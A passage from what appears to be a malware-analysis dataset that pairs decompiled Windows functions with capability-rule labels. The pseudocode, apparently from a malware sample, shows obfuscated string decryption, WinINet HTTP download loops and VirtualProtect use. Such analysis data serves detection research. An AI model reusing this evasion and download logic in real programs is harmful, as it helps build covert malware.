*arg_2ch = iVar7;\n    iStack780 = (*_sym.imp.WININET.dll_InternetOpenW)();\n    if (iStack780 == 0) goto code_r0x004063c8;\n    iStack756 = (*_sym.imp.WININET.dll_InternetConnectA)();\n    if (iStack756 == 0) {\n        uStack828 = 0x4063af;\n        (*pcVar12)();\n        fcn.00403ad4();\n    }\n    else {\n        uStack776 = 0x6a294201;\n        uStack772 = 0x6c424664;\n        uStack828 = extraout_ECX;\n        fcn.0040666e();\n        puStack784 = &stack0xfffffcf4 + -iStack564;\n        iVar7 = 0;\n        do {\n            pcVar1 = iStack564 + iVar7;\n            iVar15 = iVar7;\n            cVar5 = (*pcVar12)();\n            uVar2 = (&stack0xfffffcd0)[iVar7 % 5];\n            uVar3 = pcVar1[puStack784];\n            cVar6 = (*pcVar12)();\n            iVar7 = iVar15 + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (iVar7 < 8);\n        fcn.004066dd();\n        iVar7 = -iStack552;\n        iVar15 = 0;\n        do {\n            pcVar1 = iStack552 + iVar15;\n            iVar14 = iVar15;\n            cVar5 = (*pcVar12)();\n            uVar2 = (&stack0xfffffccc)[iVar15 % 5];\n            uVar3 = pcVar1[&stack0xfffffcd8 + iVar7];\n            cVar6 = (*pcVar12)();\n            iVar15 = iVar14 + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (iVar15 < 0x14);\n        uStack820 = 0x45506e51;\n        fcn.0040674c();\n        iVar7 = -iStack564;\n        iVar15 = 0;\n        do {\n            pcVar1 = iStack564 + iVar15;\n            iVar14 = iVar15;\n            cVar5 = (*pcVar12)();\n            uVar2 = (&stack0xfffffcc8)[iVar15 % 5];\n            uVar3 = pcVar1[&stack0xfffffcd4 + iVar7];\n            cVar6 = (*pcVar12)();\n            iVar15 = iVar14 + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (iVar15 < 0x12);\n        uStack824 = 0x6b494858;\n        uStack820 = CONCAT22(uStack820._2_2_, 0x7567);\n        fcn.004067b3();\n        iVar7 = -iStack584;\n        uStack820 = 0;\n        do {\n            iVar15 = uStack820;\n            pcVar1 = iStack584 + uStack820;\n            cVar5 = (*pcVar12)();\n            uVar2 = (&stack0xfffffcc4)[iVar15 % 6];\n            uVar3 = pcVar1[&stack0xfffffcd0 + iVar7];\n            cVar6 = (*pcVar12)();\n            uStack820 = uStack820 + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (uStack820 < 0x12);\n        if (arg_14h == 0) {\n            if (((arg_10h != 0x140) && (arg_10h != 0x20)) && (arg_10h != 0x40)) {\n                fcn.0040678e();\n                fcn.00406727();\n                fcn.004066b8();\n                fcn.0040663d();\n                goto code_r0x004063c8;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            in_stack_fffffc90 = NULL;\n            *puVar8 = 0;\n            puStack884 = 0x406025;\n            (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        }\n        iVar7 = (*_sym.imp.WININET.dll_HttpOpenRequestW)();\n        if (iVar7 == 0) {\n            (*pcVar12)();\n            fcn.00403ad4();\n        }\n        else {\n            in_stack_fffffc90 = *arg_2ch;\n            puStack884 = 0x40609a;\n            fcn.00403c68(in_stack_fffffc90, arg_28h);\n            puStack884 = &stack0xfffffdb4;\n            puStack888 = &stack0xfffffd78;\n            uStack892 = 0x1f;\n            uStack900 = 0x4060b3;\n            iStack896 = iVar7;\n            (*_sym.imp.WININET.dll_InternetQueryOptionA)();\n            uStack664 = uStack664 | 0x7380;\n            uStack900 = 4;\n            (*_sym.imp.WININET.dll_InternetSetOptionA)(iVar7, 0x1f, &stack0xfffffd68);\n            if (arg_20h != 0) {\n                iVar7 = 0x12;\n                puStack888 = 0xb3f3060;\n                puStack884 = 0x3312512b;\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n                puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                iVar15 = 0;\n                *puVar10 = 0;\n                puVar10[1] = 0;\n                puVar10[2] = 0;\n                puVar10[3] = 0;\n                *(puVar10 + 4) = 0;\n                in_stack_fffffc90 = &stack0xfffffc7c + -puVar10;\n                do {\n                    pcVar1 = iVar15 + puVar10;\n                    iVar14 = iVar15;\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = (&stack0xfffffc94)[iVar15 % 6];\n                    uVar3 = pcVar1[in_stack_fffffc90];\n                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar15 = iVar14 + 1;\n                    *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                } while (iVar15 < 0x11);\n                (*_sym.imp.USER32.dll_wsprintfA)(&stack0xfffffd8c, puVar10, *arg_ch);\n                uVar9 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&stack0xfffffd8c, 0x10000000);\n                (*_sym.imp.WININET.dll_HttpAddRequestHeadersA)(iVar7, &stack0xfffffd88, uVar9);\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                pcVar12 = _sym.imp.KERNEL32.dll_GetLastError;\n            }\n            uStack664 = 0;\n            uStack672 = 0;\n            iVar15 = (*_sym.imp.WININET.dll_HttpSendRequestA)(iVar7, 0, 0, 0, 0);\n            pcVar4 = _sym.imp.WININET.dll_HttpQueryInfoA;\n            if ((iVar15 == 0) ||\n               (iVar15 = (*_sym.imp.WININET.dll_HttpQueryInfoA)\n                                   (iVar7, 0x20000013, &stack0xfffffd4c, &stack0xfffffd50, 0),  iVar15 == 0)) {\ncode_r0x00406324:\n                (*pcVar12)();\ncode_r0x00406326:\n                fcn.00403ad4();\n            }\n            else if ((iStack692 == 200) || (iStack692 == 0xce)) {\n                uStack688 = 4;\n                iVar15 = (*pcVar4)(iVar7, 0x20000005, &stack0xfffffd54, &stack0xfffffd50, 0);\n                if (iVar15 == 0) goto code_r0x00406324;\n                if (iStack684 == 0) goto code_r0x0040632d;\n                if (arg_20h == 0) {\n                    *arg_18h = iStack684;\n                    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iStack684);\n                    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n                    *arg_ch = 0;\n                    arg_ch[1] = iVar15;\n                }\n                puVar11 = &stack0xfffffd84;\n                for (iVar15 = 0x200; iVar15 != 0; iVar15 = iVar15 + -1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                while (iVar15 = (*_sym.imp.WININET.dll_InternetReadFile)\n                                          (iVar7, &stack0xfffffd84, 0x200, &stack0xfffffd48),  iVar15 != 0) {\n                    if (iStack696 == 0) goto code_r0x0040632d;\n                    puVar11 = &stack0xfffffd84;\n                    puVar13 = arg_ch[1] + *arg_ch;\n                    for (iVar15 = iStack696; iVar15 != 0; iVar15 = iVar15 + -1) {\n                        *puVar13 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar13 = puVar13 + 1;\n                    }\n                    puVar11 = &stack0xfffffd84;\n                    for (iVar15 = 0x200; iVar15 != 0; iVar15 = iVar15 + -1) {\n                        *puVar11 = 0;\n                        puVar11 = puVar11 + 1;\n                    }\n                    *arg_1ch = *arg_1ch + iStack696;\n                    *arg_ch = *arg_ch + iStack696;\n                }\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n                goto code_r0x00406326;\n            }\ncode_r0x0040632d:\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar7);\n        }\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(uStack576);\n        fcn.0040678e();\n        fcn.00406727();\n        fcn.004066b8();\n        fcn.0040663d();\n    }\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(in_stack_fffffc90);\ncode_r0x004063c8:\n    fcn.004065d4();\n    return puStack784;\n}\n",
        "token_count": 3988
    },
    "004063e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004063e1(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.00405b32;\n    if (*0x4279d8 != 0) {\n        pcVar2 = fcn.00404e2b;\n    }\n    do {\n        iVar1 = (*pcVar2)(in_ECX);\n        if (iVar1 != 6) {\n            if (iVar1 != 0) {\n                iVar1 = (*pcVar2)(in_ECX);\n            }\n            if (iVar1 != 6) break;\n        }\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0041016b();\n    }\n    return iVar1;\n}\n",
        "token_count": 238
    },
    "0040774a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040774a(uint arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    char cVar7;\n    char cVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint uVar11;\n    uint *puVar12;\n    uint unaff_EBX;\n    int32_t iVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uStack1020;\n    uint uStack1016;\n    uchar *puStack1012;\n    uint uStack1008;\n    uint uStack1004;\n    uint uStack1000;\n    uchar *puStack996;\n    uint uStack992;\n    uchar *puStack988;\n    uint *puStack984;\n    uchar uStack980;\n    uchar uStack979;\n    ushort uStack978;\n    uint uStack976;\n    uchar uStack972;\n    ushort uStack971;\n    uchar uStack969;\n    uint uStack968;\n    uint *puStack964;\n    uint uStack960;\n    uint *puStack956;\n    uchar *puStack952;\n    uint uStack948;\n    uint uStack944;\n    char *pcStack940;\n    uchar *puStack936;\n    uchar *puStack932;\n    uint *puStack928;\n    char *pcStack924;\n    uint uStack920;\n    uint uStack916;\n    uint *puStack912;\n    uchar *puStack908;\n    uint uStack904;\n    uint uStack900;\n    code *pcStack896;\n    uint uStack892;\n    uint uStack888;\n    uint uStack884;\n    uint *puStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    ushort uStack856;\n    ushort uStack854;\n    ushort uStack852;\n    ushort uStack850;\n    ushort uStack848;\n    ushort uStack846;\n    uint uStack844;\n    uchar uStack840;\n    uchar uStack839;\n    ushort uStack838;\n    uchar uStack836;\n    uchar uStack835;\n    ushort uStack834;\n    uchar uStack832;\n    uchar uStack831;\n    uint uStack830;\n    uchar uStack826;\n    uchar uStack825;\n    ushort uStack824;\n    ushort uStack822;\n    ushort uStack820;\n    uint uStack818;\n    uint uStack814;\n    uint uStack810;\n    uint uStack806;\n    uint uStack802;\n    uint uStack798;\n    uint uStack794;\n    uchar uStack790;\n    uchar auStack784 [5];\n    uint8_t uStack779;\n    uchar auStack772 [4];\n    int32_t iStack768;\n    uint uStack764;\n    uint uStack760;\n    uint uStack756;\n    uchar auStack744 [16];\n    uint uStack728;\n    uchar auStack724 [12];\n    uchar auStack712 [36];\n    uint *puStack676;\n    uint uStack660;\n    uchar auStack612 [20];\n    uchar auStack592 [588];\n    \n    uStack856 = unaff_EBX;\n    uStack854 = unaff_EBX >> 0x10;\n    uStack839 = 6;\n    uStack868 = 0x14;\n    uStack872 = 8;\n    uStack660 = 0x208;\n    uStack844 = 0x6a512018;\n    uStack840 = 0x17;\n    uStack838 = 0x1539;\n    uStack836 = 0x42;\n    uStack835 = 0x29;\n    uStack834 = 0x1d1e;\n    uStack832 = 0x27;\n    uStack831 = 5;\n    uStack830 = 0xb143e12;\n    uStack826 = 0x55;\n    uStack852 = 0x7055;\n    uStack850 = 0x4a62;\n    uStack848 = 0x6f71;\n    uStack876 = 0x4077b9;\n    uStack876 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack880 = 0x4077c0;\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    *puVar9 = 0;\n    puVar9[1] = 0;\n    puVar9[2] = 0;\n    puVar9[3] = 0;\n    puVar9[4] = 0;\n    iVar13 = 0;\n    puVar14 = &stack0xfffffca8 + -puVar9;\n    uStack824 = 0;\n    uStack822 = 0;\n    uStack836 = SUB41(puVar14, 0);\n    uStack835 = puVar14 >> 8;\n    uStack834 = puVar14 >> 0x10;\n    puStack676 = puVar9;\n    do {\n        pcVar1 = iVar13 + puVar9;\n        puStack880 = 0x4077ed;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack880 = 0x6;\n        uVar2 = (&stack0xfffffca0)[iVar13 % 6];\n        uVar3 = pcVar1[CONCAT22(uStack834, CONCAT11(uStack835, uStack836))];\n        puStack880 = 0x40780a;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar13 = CONCAT22(uStack822, uStack824) + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        uStack824 = iVar13;\n        uStack822 = iVar13 >> 0x10;\n    } while (iVar13 < 0x13);\n    uStack884 = 0x407823;\n    puStack880 = puVar9;\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)();\n    uStack884 = 0;\n    uStack888 = 0;\n    uStack892 = 0;\n    pcStack896 = fcn.0040769b;\n    uStack900 = 0;\n    uStack904 = 0;\n    puStack908 = 0x407835;\n    puStack908 = (*_sym.imp.KERNEL32.dll_CreateThread)();\n    puStack912 = 0x40783c;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    puStack912 = 0x407841;\n    iVar13 = fcn.00406cce();\n    if (iVar13 == 0) {\n        puStack912 = 0x40784a;\n        fcn.00406fa3();\n        puStack912 = 0x40784f;\n        fcn.00412593();\n        while( true ) {\n            puStack912 = 0x407854;\n            iVar13 = fcn.004135a8();\n            if (iVar13 == 0) break;\n            puStack912 = 0x2710;\n            uStack916 = 0x407863;\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n        }\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    puStack912 = &stack0xfffffd38;\n    uStack916 = 0x40;\n    uStack920 = 0x184;\n    pcStack924 = str.OG_vAY__;\n    puStack928 = 0x407882;\n    iVar13 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n    if (iVar13 != 0) {\n        puStack928 = 0x407892;\n        fcn.00410082();\n        puStack928 = &stack0xfffffd28;\n        puStack932 = uStack728;\n        puStack936 = 0x184;\n        pcStack940 = str.OG_vAY__;\n        uStack944 = 0x4078a9;\n        (*pcVar4)();\n    }\n    puVar14 = 0x427990;\n    for (iVar13 = 0x40; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puStack928 = NULL;\n    puStack932 = 0x4078bc;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    puStack932 = 0x4078c3;\n    fcn.0040a614();\n    puVar14 = &stack0xfffffcfc;\n    for (iVar13 = 0x1c; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar14 = &stack0xfffffd18;\n    for (iVar13 = 0xc; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar14 = 0x427970;\n    for (iVar13 = 8; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar14 = &stack0xfffffdb0;\n    for (iVar13 = 0x208; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puStack932 = &stack0xfffffd2c;\n    puStack936 = &stack0xfffffdb0;\n    pcStack940 = 0x40790b;\n    iVar13 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)();\n    if (iVar13 != 0) {\n        pcStack940 = 0x25;\n        uStack944 = 0x8;\n        uStack916 = 0x54233925;\n        puStack912 = 0x706b700a;\n        puStack908 = 0x39314f1a;\n        uStack904 = 0x700a543d;\n        uStack900 = CONCAT22(uStack900._2_2_, 0x7039);\n        uStack892 = 0x54703970;\n        uStack888 = CONCAT31(uStack888._1_3_, 0x4f);\n        uStack948 = 0x407951;\n        uStack948 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack952 = 0x407958;\n        pcStack896 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n        uVar10 = 0;\n        do {\n            *(pcStack896 + uVar10) = *(pcStack896 + uVar10) ^ 0xfa;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x25);\n        puVar9 = pcStack896;\n        for (iVar13 = 9; iVar13 != 0; iVar13 = iVar13 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *puVar9 = 0;\n        puStack908 = &stack0xfffffc60 + -pcStack896;\n        iVar13 = 0;\n        do {\n            pcVar1 = pcStack896 + iVar13;\n            puStack952 = 0x407989;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            puStack952 = 0x5;\n            uVar2 = (&stack0xfffffc78)[iVar13 % 5];\n            uVar3 = pcVar1[puStack908];\n            puStack952 = 0x4079a6;\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            puVar9 = pcStack896;\n            iVar13 = iVar13 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (iVar13 < 0x12);\n        puStack952 = &stack0xfffffd9c;\n        puStack956 = pcStack896;\n        uStack960 = 0x4079c5;\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)();\n        uVar10 = 0;\n        do {\n            *(puVar9 + uVar10) = *(puVar9 + uVar10) * -0x2e;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x25);\n        uStack960 = puVar9;\n        puStack964 = NULL;\n        uStack968 = 0x4079e1;\n        uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        uStack972 = 0xe8;\n        uStack971 = 0x4079;\n        uStack969 = 0;\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)();\n    }\n    pcStack940 = 0x4079f8;\n    iVar13 = fcn.0040d287();\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    if (iVar13 != 0) {\n        if (2 < uStack779) {\n            iVar13 = 0;\n            if (0 < uStack779 - 2) {\n                do {\n                    *0x427964 = *0x427964 + *(&stack0xfffffd00 + iVar13 * 4);\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < uStack779 - 2);\n            }\n        }\n        *0x427964 = *0x427964 ^ 0x3dd5193;\n        pcStack940 = 0x407a44;\n        iVar13 = fcn.00406dcb();\n        if (iVar13 != 0) {\n            if (*0x4279e8 < 6) {\n                pcStack940 = 0x44;\n                uStack944 = 0x8;\n                uStack856 = 0x5815;\n                uStack854 = 0xd4f;\n                uStack852 = 0x3e59;\n                uStack850 = 0x2118;\n                uStack848 = 0x722e;\n                uStack846 = 0x3025;\n                uStack844 = 0xb5c596a;\n                uStack840 = 0x25;\n                uStack839 = 0x58;\n                uStack838 = 0x2679;\n                uStack836 = 0x5c;\n                uStack835 = 6;\n                uStack834 = 0x322b;\n                uStack832 = 0x18;\n                uStack831 = 0x59;\n                uStack830 = 0x4a590820;\n                uStack826 = 0x6a;\n                uStack825 = 0x23;\n                uStack824 = 0x6029;\n                uStack822 = 0x304a;\n                uStack820 = 0x2d6a;\n                uStack818 = 0x4a2b0a2e;\n                uStack814 = 0x725c2316;\n                uStack810 = 0x4b043059;\n                uStack806 = 0x3e59084f;\n                uStack802 = 0x722e2118;\n                uStack798 = 0x596a3025;\n                uStack794 = 0x58230b5c;\n                uStack790 = 0x51;\n                pcStack924 = 0x49676251;\n                uStack920 = CONCAT22(uStack920._2_2_, 0x7162);\n                uStack948 = 0x407bac;\n                uStack948 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                puStack952 = 0x407baf;\n                puVar9 = (*pcVar4)();\n                puStack952 = 0x44;\n                puStack956 = NULL;\n                puStack964 = 0x407bba;\n                uStack960 = puVar9;\n                sub.ntdll.dll_memset();\n                puStack908 = &stack0xfffffc9c + -puVar9;\n                pcStack896 = NULL;\n                do {\n                    puVar15 = pcStack896;\n                    pcVar1 = pcStack896 + puVar9;\n                    puStack952 = 0x407bd6;\n                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    puStack952 = 0x6;\n                    uVar2 = (&stack0xfffffc58)[puVar15 % 6];\n                    uVar3 = pcVar1[puStack908];\n                    puStack952 = 0x407bf3;\n                    cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    pcStack896 = pcStack896 + 1;\n                    *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n                } while (pcStack896 < 0x43);\n            }\n            else {\n                pcStack940 = 0x11;\n                uStack944 = 0x8;\n                uStack916 = 0x4507f3e;\n                puStack912 = 0x367e563c;\n                puStack908 = 0x7e564b1e;\n                uStack904 = 0x6d591e34;\n                uStack892 = 0x4978456d;\n                uStack888 = CONCAT31(uStack888._1_3_, 0x70);\n                uStack948 = 0x407a90;\n                uStack948 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                puStack952 = 0x407a93;\n                puVar9 = (*pcVar4)();\n                *puVar9 = 0;\n                puVar9[1] = 0;\n                puVar9[2] = 0;\n                puVar9[3] = 0;\n                *(puVar9 + 4) = 0;\n                puStack908 = &stack0xfffffc60 + -puVar9;\n                pcStack896 = NULL;\n                do {\n                    puVar15 = pcStack896;\n                    pcVar1 = pcStack896 + puVar9;\n                    puStack952 = 0x407ab9;\n                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    puStack952 = 0x5;\n                    uVar2 = (&stack0xfffffc78)[puVar15 % 5];\n                    uVar3 = pcVar1[puStack908];\n                    puStack952 = 0x407ad6;\n                    cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    pcStack896 = pcStack896 + 1;\n                    *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n                } while (pcStack896 < 0x10);\n            }\n            uStack764 = 0xc;\n            puStack952 = NULL;\n            puStack956 = &stack0xfffffd08;\n            uStack756 = 0;\n            uStack960 = 0x1;\n            uStack760 = 0;\n            uStack968 = 0x407c32;\n            puStack964 = puVar9;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)();\n            uStack972 = 0;\n            uStack971 = 0;\n            uStack969 = 0;\n            uStack976 = 0x407c3a;\n            uStack968 = puVar9;\n            uStack976 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            uStack980 = 0x41;\n            uStack979 = 0x7c;\n            uStack978 = 0x40;\n            (*_sym.imp.KERNEL32.dll_HeapFree)();\n        }\n    }\n    pcStack940 = 0x407c46;\n    *0x427988 = fcn.0040754e();\n    pcStack940 = 0xf;\n    *0x427988 = *0x427988 & 0xffff;\n    uStack944 = 0x8;\n    uStack916 = 0x39171235;\n    puStack912 = 0x1702332b;\n    puStack908 = 0xf3c2d02;\n    uStack904 = CONCAT22(uStack904._2_2_, 0x6600);\n    uStack892 = 0x66726a50;\n    uStack888 = CONCAT31(uStack888._1_3_, 0x58);\n    uStack948 = 0x407c86;\n    uStack948 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack952 = 0x407c8d;\n    pcStack896 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    uStack884 = 0;\n    *pcStack896 = 0;\n    *(pcStack896 + 4) = 0;\n    *(pcStack896 + 8) = 0;\n    *(pcStack896 + 0xc) = 0;\n    *(pcStack896 + 0xe) = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    puStack908 = &stack0xfffffc60 + -pcStack896;\n    do {\n        iVar13 = uStack884;\n        pcVar1 = uStack884 + pcStack896;\n        puStack952 = 0x407cb6;\n        cVar7 = (*pcVar4)();\n        puStack952 = 0x5;\n        uVar2 = (&stack0xfffffc78)[iVar13 % 5];\n        uVar3 = pcVar1[puStack908];\n        puStack952 = 0x407ccf;\n        cVar8 = (*pcVar4)();\n        uStack884 = uStack884 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (uStack884 < 0xe);\n    puStack952 = 0xf;\n    puStack956 = 0x8;\n    puStack928 = 0x212f2d29;\n    pcStack924 = 0x21353b35;\n    uStack920 = 0x2d373421;\n    uStack916 = CONCAT22(uStack916._2_2_, 0x4f23);\n    uStack904 = 0x4f4e595a;\n    uStack900 = CONCAT31(uStack900._1_3_, 0x51);\n    uStack960 = 0x407d1b;\n    uStack960 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack964 = 0x407d22;\n    pcStack896 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    *pcStack896 = 0;\n    *(pcStack896 + 4) = 0;\n    *(pcStack896 + 8) = 0;\n    *(pcStack896 + 0xc) = 0;\n    *(pcStack896 + 0xe) = 0;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    uStack904 = 0;\n    uStack920 = &stack0xfffffc54 + -pcStack896;\n    do {\n        iVar13 = uStack904;\n        pcVar1 = uStack904 + pcStack896;\n        puStack964 = 0x407d4f;\n        cVar7 = (*pcVar4)();\n        puStack964 = 0x5;\n        uVar2 = (&stack0xfffffc6c)[iVar13 % 5];\n        uVar3 = pcVar1[uStack920];\n        puStack964 = 0x407d68;\n        cVar8 = (*pcVar4)();\n        uStack904 = uStack904 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (uStack904 < 0xe);\n    puStack964 = 0x7;\n    uStack968 = 0x8;\n    uStack948 = 0x6f1a0057;\n    uStack944 = CONCAT22(uStack944._2_2_, 0x723c);\n    uStack888 = 0x4a457372;\n    uStack884 = CONCAT31(uStack884._1_3_, 0x58);\n    uStack972 = 0xa6;\n    uStack971 = 0x407d;\n    uStack969 = 0;\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = uVar11;\n    uStack971 = uVar11 >> 8;\n    uStack969 = uVar11 >> 0x18;\n    uStack976 = 0x407dad;\n    puStack984 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack916 = 0;\n    *puStack984 = 0;\n    *(puStack984 + 1) = 0;\n    *(puStack984 + 6) = 0;\n    puStack932 = &stack0xfffffc40 + -puStack984;\n    puStack928 = puStack984;\n    do {\n        iVar13 = uStack916;\n        pcVar1 = uStack916 + puStack984;\n        uStack976 = 0x407dd2;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack976 = 5;\n        uVar2 = (&stack0xfffffc7c)[iVar13 % 5];\n        uVar3 = pcVar1[puStack932];\n        uStack976 = 0x407def;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        uStack916 = uStack916 + 1;\n    } while (uStack916 < 6);\n    uStack976 = *0x426260;\n    puStack988 = &stack0xfffffd04;\n    uStack980 = SUB41(uStack920, 0);\n    uStack979 = uStack920 >> 8;\n    uStack978 = uStack920 >> 0x10;\n    uStack992 = 0x407e1c;\n    (*_sym.imp.USER32.dll_wsprintfA)();\n    *0x427988 = 6000;\n    puStack912 = puStack912 & 0xff000000 | 0x4c124f;\n    puStack952 = 0x724c766a;\n    uStack976 = 4;\n    uStack980 = 8;\n    uStack979 = 0;\n    uStack978 = 0;\n    uStack948 = CONCAT31(uStack948._1_3_, 0x61);\n    puStack984 = 0x407e4c;\n    puStack984 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack988 = 0x407e53;\n    puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    puStack928 = NULL;\n    *puVar9 = 0;\n    uStack944 = &stack0xfffffc64 + -puVar9;\n    puStack912 = puVar9;\n    do {\n        iVar13 = puStack928;\n        pcVar1 = puStack928 + puVar9;\n        puStack988 = 0x407e76;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack988 = 0x5;\n        uVar2 = (&stack0xfffffc3c)[iVar13 % 5];\n        uVar3 = pcVar1[uStack944];\n        puStack988 = 0x407e93;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack928 = puStack928 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (puStack928 < 3);\n    puStack988 = *0x427988;\n    puStack996 = &stack0xfffffd38;\n    uStack1000 = 0x407eba;\n    uStack992 = puVar9;\n    (*_sym.imp.USER32.dll_wsprintfA)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    puStack964 = 0x572d3923;\n    uStack960 = 